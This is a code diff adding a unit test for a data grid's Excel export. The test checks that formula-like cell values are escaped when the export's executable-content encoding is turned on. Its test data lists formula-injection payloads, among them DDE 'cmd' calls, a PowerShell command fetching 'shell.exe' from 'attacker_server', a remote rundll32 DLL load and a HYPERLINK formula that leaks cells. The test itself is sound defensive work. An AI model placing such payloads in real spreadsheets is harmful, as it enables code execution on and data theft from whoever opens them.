@@ -6522,3 +6522,134 @@ LoadPanelTests.runTests(moduleConfig, exportDataGrid, (options) => $('#dataGrid'
         dataSource: [{ f1: 'f1_1' }],
         loadingTimeout: null
     }, 'worksheet');
+
+QUnit.module('Encode', moduleConfig, () => {
+    QUnit.test('Encode test', function(assert) {
+        const done = assert.async();
+
+        const ds = [
+            { value: '=test' },
+            { value: '="test"' },
+            { value: '="test ' },
+            { value: '=cmd|\' /C calc\'!A1' },
+            { value: '5' },
+            { value: '"5"' },
+            { value: '+5' },
+            { value: '"+5"' },
+            { value: '-5' },
+            { value: '"-5"' },
+            { value: '5.5' },
+            { value: '"5.5"' },
+            { value: '-5.5' },
+            { value: '"-5.5"' },
+            { value: '+5.5' },
+            { value: '"+5.5"' },
+            { value: '=5' },
+            { value: '"=5"' },
+            { value: '@5' },
+            { value: '"@5"' },
+            { value: '=2+5' },
+            { value: '"=2+5"' },
+            { value: '+2+5' },
+            { value: '"+2+5"' },
+            { value: '-2+5' },
+            { value: '"-2+5"' },
+            { value: '+' },
+            { value: '"+"' },
+            { value: '=++' },
+            { value: '"=++"' },
+            { value: '-' },
+            { value: '"-"' },
+            { value: '=' },
+            { value: '"="' },
+            { value: '@' },
+            { value: '@MyData"Column' },
+            { value: '"@"' },
+            { value: '=1+2";=1+2' },
+            { value: '=1+2\'" ;,=1+2' },
+            { value: '=CONCATENATE("1","2")' },
+            { value: '\ttab' },
+            { value: '\rCarriage return' },
+            { value: '\r=2+3' },
+            { value: '=DDE ("cmd";"/C calc";"!A0")A0' },
+            { value: '@SUM(1+9)*cmd|\' /C calc\'!A0' },
+            { value: '=10+20+cmd|\' /C calc\'!A0\'' },
+            { value: '=cmd|\' /C notepad\'!\'A1\'' },
+            { value: '=cmd|\'/C powershell IEX(wget attacker_server/shell.exe)\'!A0\'' },
+            { value: '=cmd|\'/c rundll32.exe \\10.0.0.1\\3\\2\\1.dll,0\'!_xlbgnm.A1' },
+            { value: '=HYPERLINK("http://example.com?leak="&A1&A2,"Error: please click for further information")' },
+        ];
+
+        const dataGrid = $('#dataGrid').dxDataGrid({
+            columns: [{ dataField: 'value' }],
+            dataSource: ds,
+            showColumnHeaders: false,
+            loadingTimeout: null
+        }).dxDataGrid('instance');
+
+        const expectedCells = [
+            [{ excelCell: { value: '"\'=test"', dataType: 'string', type: ExcelJS.ValueType.String, numFmt: '@' }, gridCell: { } }],
+            [{ excelCell: { value: '"\'=""test"""', dataType: 'string', type: ExcelJS.ValueType.String, numFmt: '@' }, gridCell: { } }],
+            [{ excelCell: { value: '"\'=""test "', dataType: 'string', type: ExcelJS.ValueType.String, numFmt: '@' }, gridCell: { } }],
+            [{ excelCell: { value: '"\'=cmd|\' /C calc\'!A1"', dataType: 'string', type: ExcelJS.ValueType.String, numFmt: '@' }, gridCell: { } }],
+            [{ excelCell: { value: '5', dataType: 'string', type: ExcelJS.ValueType.String }, gridCell: { } }],
+            [{ excelCell: { value: '"5"', dataType: 'string', type: ExcelJS.ValueType.String }, gridCell: { } }],
+            [{ excelCell: { value: '+5', dataType: 'string', type: ExcelJS.ValueType.String, numFmt: '@' }, gridCell: { } }],
+            [{ excelCell: { value: '"+5"', dataType: 'string', type: ExcelJS.ValueType.String }, gridCell: { } }],
+            [{ excelCell: { value: '-5', dataType: 'string', type: ExcelJS.ValueType.String, numFmt: '@' }, gridCell: { } }],
+            [{ excelCell: { value: '"-5"', dataType: 'string', type: ExcelJS.ValueType.String }, gridCell: { } }],
+            [{ excelCell: { value: '5.5', dataType: 'string', type: ExcelJS.ValueType.String }, gridCell: { } }],
+            [{ excelCell: { value: '"5.5"', dataType: 'string', type: ExcelJS.ValueType.String }, gridCell: { } }],
+            [{ excelCell: { value: '-5.5', dataType: 'string', type: ExcelJS.ValueType.String, numFmt: '@' }, gridCell: { } }],
+            [{ excelCell: { value: '"-5.5"', dataType: 'string', type: ExcelJS.ValueType.String }, gridCell: { } }],
+            [{ excelCell: { value: '+5.5', dataType: 'string', type: ExcelJS.ValueType.String, numFmt: '@' }, gridCell: { } }],
+            [{ excelCell: { value: '"+5.5"', dataType: 'string', type: ExcelJS.ValueType.String }, gridCell: { } }],
+            [{ excelCell: { value: '"\'=5"', dataType: 'string', type: ExcelJS.ValueType.String, numFmt: '@' }, gridCell: { } }],
+            [{ excelCell: { value: '"\'=5"', dataType: 'string', type: ExcelJS.ValueType.String }, gridCell: { } }],
+            [{ excelCell: { value: '"\'@5"', dataType: 'string', type: ExcelJS.ValueType.String, numFmt: '@' }, gridCell: { } }],
+            [{ excelCell: { value: '"\'@5"', dataType: 'string', type: ExcelJS.ValueType.String }, gridCell: { } }],
+            [{ excelCell: { value: '"\'=2+5"', dataType: 'string', type: ExcelJS.ValueType.String, numFmt: '@' }, gridCell: { } }],
+            [{ excelCell: { value: '"\'=2+5"', dataType: 'string', type: ExcelJS.ValueType.String }, gridCell: { } }],
+            [{ excelCell: { value: '"\'+2+5"', dataType: 'string', type: ExcelJS.ValueType.String, numFmt: '@' }, gridCell: { } }],
+            [{ excelCell: { value: '"\'+2+5"', dataType: 'string', type: ExcelJS.ValueType.String }, gridCell: { } }],
+            [{ excelCell: { value: '"\'-2+5"', dataType: 'string', type: ExcelJS.ValueType.String, numFmt: '@' }, gridCell: { } }],
+            [{ excelCell: { value: '"\'-2+5"', dataType: 'string', type: ExcelJS.ValueType.String }, gridCell: { } }],
+            [{ excelCell: { value: '+', dataType: 'string', type: ExcelJS.ValueType.String, numFmt: '@' }, gridCell: { } }],
+            [{ excelCell: { value: '"+"', dataType: 'string', type: ExcelJS.ValueType.String }, gridCell: { } }],
+            [{ excelCell: { value: '"\'=++"', dataType: 'string', type: ExcelJS.ValueType.String, numFmt: '@' }, gridCell: { } }],
+            [{ excelCell: { value: '"\'=++"', dataType: 'string', type: ExcelJS.ValueType.String }, gridCell: { } }],
+            [{ excelCell: { value: '-', dataType: 'string', type: ExcelJS.ValueType.String, numFmt: '@' }, gridCell: { } }],
+            [{ excelCell: { value: '"-"', dataType: 'string', type: ExcelJS.ValueType.String }, gridCell: { } }],
+            [{ excelCell: { value: '=', dataType: 'string', type: ExcelJS.ValueType.String, numFmt: '@' }, gridCell: { } }],
+            [{ excelCell: { value: '"="', dataType: 'string', type: ExcelJS.ValueType.String }, gridCell: { } }],
+            [{ excelCell: { value: '@', dataType: 'string', type: ExcelJS.ValueType.String, numFmt: '@' }, gridCell: { } }],
+            [{ excelCell: { value: '"\'@MyData""Column"', dataType: 'string', type: ExcelJS.ValueType.String, numFmt: '@' }, gridCell: { } }],
+            [{ excelCell: { value: '"@"', dataType: 'string', type: ExcelJS.ValueType.String }, gridCell: { } }],
+            [{ excelCell: { value: '"\'=1+2"";=1+2"', dataType: 'string', type: ExcelJS.ValueType.String, numFmt: '@' }, gridCell: { } }],
+            [{ excelCell: { value: '"\'=1+2\'"" ;,=1+2"', dataType: 'string', type: ExcelJS.ValueType.String, numFmt: '@' }, gridCell: { } }],
+            [{ excelCell: { value: '"\'=CONCATENATE(""1"",""2"")"', dataType: 'string', type: ExcelJS.ValueType.String, numFmt: '@' }, gridCell: { } }],
+            [{ excelCell: { value: '"\'	tab"', dataType: 'string', type: ExcelJS.ValueType.String }, gridCell: { } }],
+            [{ excelCell: { value: '"\'\rCarriage return"', dataType: 'string', type: ExcelJS.ValueType.String }, gridCell: { } }],
+            [{ excelCell: { value: '"\'\r=2+3"', dataType: 'string', type: ExcelJS.ValueType.String }, gridCell: { } }],
+            [{ excelCell: { value: '"\'=DDE (""cmd"";""/C calc"";""!A0"")A0"', dataType: 'string', type: ExcelJS.ValueType.String, numFmt: '@' }, gridCell: { } }],
+            [{ excelCell: { value: '"\'@SUM(1+9)*cmd|\' /C calc\'!A0"', dataType: 'string', type: ExcelJS.ValueType.String, numFmt: '@' }, gridCell: { } }],
+            [{ excelCell: { value: '"\'=10+20+cmd|\' /C calc\'!A0\'"', dataType: 'string', type: ExcelJS.ValueType.String, numFmt: '@' }, gridCell: { } }],
+            [{ excelCell: { value: '"\'=cmd|\' /C notepad\'!\'A1\'"', dataType: 'string', type: ExcelJS.ValueType.String, numFmt: '@' }, gridCell: { } }],
+            [{ excelCell: { value: '"\'=cmd|\'/C powershell IEX(wget attacker_server/shell.exe)\'!A0\'"', dataType: 'string', type: ExcelJS.ValueType.String, numFmt: '@' }, gridCell: { } }],
+            [{ excelCell: { value: '"\'=cmd|\'/c rundll32.exe \\10.0.0.1\\3\\2\\1.dll,0\'!_xlbgnm.A1"', dataType: 'string', type: ExcelJS.ValueType.String, numFmt: '@' }, gridCell: { } }],
+            [{ excelCell: { value: '"\'=HYPERLINK(""http://example.com?leak=""&A1&A2,""Error: please click for further information"")"', dataType: 'string', type: ExcelJS.ValueType.String, numFmt: '@' }, gridCell: { } }],
+        ];
+
+        helper._extendExpectedCells(expectedCells, { row: 1, column: 1 });
+
+        exportDataGrid({
+            component: dataGrid,
+            worksheet: this.worksheet,
+            encodeExecutableContent: true,
+        }).then(() => {
+            helper.checkValues(expectedCells);
+            helper.checkCellFormat(expectedCells);
+            done();
+        });
+    });
+});
